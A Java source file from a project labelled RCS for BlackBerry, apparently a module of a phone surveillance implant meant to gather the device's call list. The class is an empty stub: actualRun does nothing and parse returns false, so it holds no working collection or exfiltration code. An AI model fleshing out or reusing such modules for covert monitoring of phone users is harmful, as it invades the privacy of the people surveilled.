//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallListAgent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class CallListAgent.
 */
public final class CallListAgent extends Agent {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);

    //#endif

    /**
     * Instantiates a new call list agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public CallListAgent(final boolean agentStatus) {
        super(Agent.AGENT_CALLLIST, agentStatus, true, "CallListAgent");

    }

    /**
     * Instantiates a new call list agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected CallListAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
